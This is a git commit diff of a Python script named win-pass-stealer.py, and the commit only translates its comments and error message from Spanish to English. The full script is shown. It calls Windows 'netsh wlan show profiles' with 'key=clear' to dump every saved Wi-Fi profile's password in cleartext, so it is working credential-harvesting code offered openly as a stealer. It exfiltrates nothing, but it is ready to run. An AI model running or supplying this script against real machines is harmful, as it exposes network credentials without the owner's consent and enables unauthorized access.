cc0e75e876b6993841d909aa3aae9a027a04ab42
mordecai <142639542+m0rd3caii@users.noreply.github.com>
2024-03-05 01:26:48 +0100

    Update win-pass-stealer.py

--- win-pass-stealer.py
+++ win-pass-stealer.py
@@ -1,16 +1,16 @@
 import subprocess
 
-# Obtener los perfiles de red inalambrica
+# Get wireless network profiles
 output_profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
 
-# Filtrar solo los nombres de los perfiles de usuario
+# Filter only user profile names
 profiles = [line.split(":")[1].strip() for line in output_profiles if "All User Profile" in line]
 
-# Obtener las contraseñas de los perfiles
+# Get profile passwords
 for profile in profiles:
     try:
         output_password = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', profile, 'key=clear']).decode('utf-8').split('\n')
         password_lines = [line.split(":")[1].strip() for line in output_password if "Key Content" in line]
         print("{:<30}| {:<}".format(profile, password_lines[0] if password_lines else ""))
     except subprocess.CalledProcessError:
-        print("Error al obtener la contraseña para el perfil:", profile)
+        print("[!]Error getting password for profile:", profile)
